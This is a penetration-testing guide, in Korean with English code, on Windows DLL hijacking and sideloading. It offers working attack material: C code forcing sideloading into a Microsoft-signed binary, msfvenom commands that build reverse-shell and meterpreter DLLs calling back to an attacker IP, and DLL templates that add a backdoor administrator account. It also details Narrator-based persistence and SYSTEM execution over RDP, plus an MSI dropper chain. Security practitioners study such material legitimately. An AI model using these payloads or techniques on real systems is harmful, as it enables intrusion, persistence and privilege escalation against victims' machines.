# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 말합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포함합니다. 주로 코드 실행, 지속성 확보에 사용되며, 드물게 권한 상승에도 이용됩니다. 이 문서에서는 권한 상승에 초점을 맞추지만, hijacking 방법 자체는 목적에 상관없이 동일합니다.

### 일반적인 기법

DLL hijacking에는 애플리케이션의 DLL 로드 전략에 따라 효과가 달라지는 여러 방법이 사용됩니다:

1. **DLL Replacement**: 정식 DLL을 악성 DLL로 교체하는 방법으로, 원래 DLL의 기능을 유지하기 위해 DLL Proxying을 함께 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 정식 DLL보다 먼저 검색되는 경로에 배치하여 로드되도록 하는 방법입니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요로 하지만 존재하지 않는 것으로 생각하는 DLL을 악성으로 만들어 로드하게 하는 방법입니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 같은 검색 파라미터를 수정하여 애플리케이션이 악성 DLL을 가리키게 만드는 방법입니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리 내의 정식 DLL을 악성 버전으로 대체하는 방법으로, 종종 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 애플리케이션을 복사한 사용자 제어 디렉터리에 악성 DLL을 배치하는 방법으로, Binary Proxy Execution 기법과 유사합니다.

## 누락된 Dll 찾기

시스템 내부에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행한 뒤, **다음 2개의 필터**를 설정하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../../images/image (153).png>)

일반적으로 **missing dlls in general**을 찾고 있다면 이 상태로 몇 초 동안 실행 상태를 유지하면 됩니다.  
특정 실행 파일 내의 **missing dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정한 뒤 해당 실행 파일을 실행하고 이벤트 캡처를 중지하면 됩니다.

## Exploiting Missing Dlls

권한 상승을 시도할 때 가장 좋은 기회는 권한이 높은 프로세스가 로드하려고 할 DLL을 우리가 쓸 수 있는 위치에 쓰는 것입니다. 따라서 악성 dll을 원본 dll이 있는 폴더보다 먼저 검색되는 폴더에 쓰거나(특이한 경우), 검색 경로에는 포함되지만 원본 dll이 어떤 폴더에도 존재하지 않는 경우 해당 폴더에 쓸 수 있어야 합니다.

### Dll 검색 순서

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows 애플리케이션은 정해진 검색 경로 집합을 순서대로 따라 DLL을 찾습니다. 유해한 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되면 정식 DLL보다 먼저 로드되어 DLL hijacking이 발생합니다. 이를 방지하려면 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 해야 합니다.

32-bit 시스템에서의 DLL 검색 순서는 다음과 같습니다:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

이는 **SafeDllSearchMode**가 활성화된 경우의 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉터리가 두 번째 순위로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하면 됩니다(기본값은 활성화).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그와 함께 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, **dll이 이름 대신 절대 경로로 지정되어 로드될 수 있다**는 점을 유의하세요. 이 경우 해당 dll은 **그 경로에서만 검색**됩니다(해당 dll이 종속성을 가지면, 그 종속성들은 이름으로만 로드된 것으로 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성되는 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기서 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 DLL을 이름으로(절대 경로가 아니고 안전 로드 플래그를 사용하지 않고) 해결할 때 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 파라미터를 생성할 때 DllPath를 당신이 제어하는 폴더(e.g., dropper/unpacker가 있는 디렉터리)로 지정합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해결할 때 로더는 제공된 DllPath를 참조하여 resolution을 수행하므로, 악성 DLL이 대상 EXE와 같은 위치에 없더라도 신뢰할 수 있는 sideloading이 가능해집니다.

참고/제약
- 이는 생성되는 자식 프로세스에만 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않을 것).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위에 영향을 줄 수 있습니다.

간단한 C 예제 (ntdll, wide strings, 에러 처리 단순화):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

운영상 사용 예
- 악성 xmllite.dll(필요한 함수를 export하거나 실제 DLL로 프록시하는)을 DllPath 디렉터리에 배치하세요.
- 위 기법을 사용하여 이름으로 xmllite.dll을 찾는 것으로 알려진 서명된 바이너리를 실행하세요. loader는 제공된 DllPath를 통해 import를 해결하고 당신의 DLL을 sideload합니다.

이 기법은 멀티 스테이지 sideloading 체인을 유도하는 실제 사례에서 관찰되었습니다: 초기 런처가 헬퍼 DLL을 떨어뜨리고, 그 헬퍼는 커스텀 DllPath를 가진 Microsoft-signed, hijackable 바이너리를 실행시켜 스테이징 디렉터리에서 공격자 DLL의 로드를 강제합니다.


#### Windows 문서에서 설명한 dll 검색 순서의 예외사항

표준 DLL 검색 순서에 대한 특정 예외가 Windows 문서에 명시되어 있습니다:

- 이미 메모리에 로드된 것과 이름이 같은 **DLL이 발견될 때**, 시스템은 일반적인 검색을 우회합니다. 대신 리디렉션과 매니페스트를 확인한 뒤 기본적으로 이미 메모리에 있는 DLL을 사용합니다. **이 경우 시스템은 DLL 검색을 수행하지 않습니다.**
- DLL이 현재 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL의 버전과 그에 종속된 DLL들을 사용하며 **검색 과정을 생략합니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL들의 목록이 저장되어 있습니다.
- **DLL이 종속성을 가질 경우**, 이러한 종속 DLL들에 대한 검색은 초기 DLL이 전체 경로로 지정되었는지 여부와 관계없이 마치 이들이 **module names**로만 표시된 것처럼 수행됩니다.

### 권한 상승

**요구사항**:

- **다른 권한**(horizontal or lateral movement)으로 동작하거나 동작할 프로세스 중에서 **DLL이 없는** 프로세스를 식별하세요.
- **DLL이 검색될** 어떤 **디렉터리**에 대해 **쓰기 권한**이 있는지 확인하세요. 이 위치는 실행 파일의 디렉터리나 시스템 경로 내의 디렉터리일 수 있습니다.

네, 요구 조건을 찾기는 까다롭습니다. 기본적으로 **권한이 높은 실행 파일에서 dll이 빠져 있는 경우를 찾는 것은 다소 이상하고** 시스템 경로 폴더에 **쓰기 권한을 갖는 것은 더욱 이상합니다**(기본적으로 불가능합니다). 하지만 설정이 잘못된 환경에서는 가능할 수 있습니다. 운이 좋아 요구 조건을 충족하는 경우 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 비록 **프로젝트의 주요 목표는 bypass UAC**일지라도, 해당 Windows 버전에 맞는 Dll hijaking의 **PoC**를 찾을 수 있을 것입니다(아마도 단지 쓰기 권한이 있는 폴더의 경로만 변경하면 됩니다).

참고로 폴더의 **권한을 확인할 수 있습니다** 다음과 같이:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
다음 명령으로 executable의 imports와 dll의 exports를 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 검사합니다.\
이 취약점을 찾아내기 위한 다른 유용한 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### Example

공격 가능한 시나리오를 찾은 경우, 성공적으로 익스플로잇하기 위해 가장 중요한 것 중 하나는 **create a dll that exports at least all the functions the executable will import from it**입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)로 권한을 상승시키는 데 유용하다는 점을 유의하세요. 실행을 위한 dll hijacking 연구에서 **how to create a valid dll**의 예시는 다음에서 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
또한, **다음 섹션**에서는 **basic dll codes**로 사용할 수 있는 몇 가지 기본 dll 코드(템플릿으로 유용하거나 불필요한 함수들을 내보내는 dll을 만드는 데 사용 가능)를 찾을 수 있습니다.

## **Creating and compiling Dlls**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **execute your malicious code when loaded**할 수 있으면서, 동시에 실제 라이브러리로의 모든 호출을 전달함으로써 기대한 대로 **expose**하고 **work**할 수 있는 Dll입니다.

도구 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 실행 파일을 지정하고 proxify할 라이브러리를 선택하여 proxified dll을 생성하거나, Dll을 지정하여 proxified dll을 생성할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86, x64 버전은 확인하지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자신만의

컴파일한 Dll은 피해자 프로세스에서 로드될 **export several functions** 을 반드시 제공해야 하는 경우가 있습니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** 되며 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>대체 C DLL (스레드 엔트리 포함)</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 여전히 조회(probe)하며, 이를 hijack하여 arbitrary code execution 및 persistence를 얻을 수 있습니다.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 단순한 hijack은 UI를 말하거나 강조 표시합니다. 조용히 하려면 attach 시 Narrator 스레드를 열거하고, 메인 스레드(`OpenThread(THREAD_SUSPEND_RESUME)`)를 열어 `SuspendThread`로 일시중단한 뒤 자체 스레드에서 계속 진행하세요. 전체 코드는 PoC를 참조하세요.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator가 시작될 때 심어둔 DLL이 로드됩니다. 보안 데스크탑(로그온 화면)에서는 CTRL+WIN+ENTER를 눌러 Narrator를 시작하세요.

RDP-triggered SYSTEM execution (lateral movement)
- 고전 RDP 보안 레이어 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면, 보안 데스크탑에서 귀하의 DLL이 SYSTEM 권한으로 실행됩니다.
- RDP 세션이 종료되면 실행도 중단되므로—빠르게 inject/migrate 하세요.

Bring Your Own Accessibility (BYOA)
- 내장 Accessibility Tool(예: CursorIndicator)의 레지스트리 항목을 복제한 다음 임의의 바이너리/DLL을 가리키도록 편집해 가져온 뒤, `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이는 Accessibility 프레임워크 하에서 임의 실행을 프록시합니다.

Notes
- `%windir%\System32`에 쓰기 및 HKLM 값 변경은 관리자 권한이 필요합니다.
- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 둘 수 있으며, export는 필요 없습니다.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu(`TPQMAssistant.exe`)에서 발생한 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적됩니다.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` 위치: `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`는 매일 오전 9:30에 로그인한 사용자 컨텍스트로 실행됩니다.
- **Directory Permissions**: `CREATOR OWNER`에 쓰기 권한이 있어 로컬 사용자가 임의 파일을 놓을 수 있습니다.
- **DLL Search Behavior**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려 시도하며, 없으면 "NAME NOT FOUND"를 기록하여 로컬 디렉터리 검색 우선순위를 나타냅니다.

### Exploit Implementation

공격자는 동일 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여 누락된 DLL을 악용하고 사용자 컨텍스트에서 코드 실행을 달성할 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치합니다.
2. 현재 사용자 컨텍스트에서 예약 작업이 오전 9:30에 실행되기를 기다립니다.
3. 작업이 실행될 때 관리자가 로그인되어 있으면, 악성 DLL이 관리자의 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass 기법을 연계하여 medium integrity에서 SYSTEM 권한으로 상승합니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자는 종종 MSI 기반 droppers를 DLL side-loading과 결합하여 신뢰된, 서명된 프로세스에서 payload를 실행합니다.

Chain overview
- 사용자가 MSI를 다운로드합니다. GUI 설치 중에 CustomAction이 백그라운드에서 조용히 실행되어(예: LaunchApplication 또는 VBScript 액션), 임베디드 리소스에서 다음 단계를 재구성합니다.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- 서명된 EXE가 실행되면, Windows의 DLL 검색 순서가 작업 디렉터리에서 먼저 wsc.dll을 로드하여 서명된 부모 프로세스 하에서 공격자 코드를 실행합니다 (ATT&CK T1574.001).

MSI 분석 (찾아볼 항목)
- CustomAction 테이블:
- 실행 파일 또는 VBScript를 실행하는 항목을 찾아보세요. 의심스러운 예시 패턴: LaunchApplication이 백그라운드에서 임베디드 파일을 실행하는 경우.
- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사합니다.
- MSI CAB에 포함된/분할된 payloads:
- 관리자 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 연결되고 복호화되는 여러 개의 작은 조각을 찾아보세요. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe를 이용한 실전 sideloading
- 이 두 파일을 동일한 폴더에 넣으세요:
- wsc_proxy.exe: 정상적으로 서명된 호스트(Avast). 프로세스는 해당 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: attacker DLL. 특정 exports가 필요하지 않다면 DllMain으로 충분합니다; 그렇지 않다면 proxy DLL을 빌드해 필요한 exports를 genuine library로 포워딩하고 DllMain에서 payload를 실행하세요.
- 최소한의 DLL payload를 빌드:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- For export requirements, 프록시 프레임워크(예: DLLirant/Spartacus)를 사용하여 payload도 실행하는 forwarding DLL을 생성하세요.

- 이 기술은 host binary에 의한 DLL name resolution에 의존합니다. 호스트가 absolute paths 또는 safe loading flags(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, and forwarded exports는 우선순위에 영향을 줄 수 있으므로 host binary와 export set을 선택할 때 고려해야 합니다.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
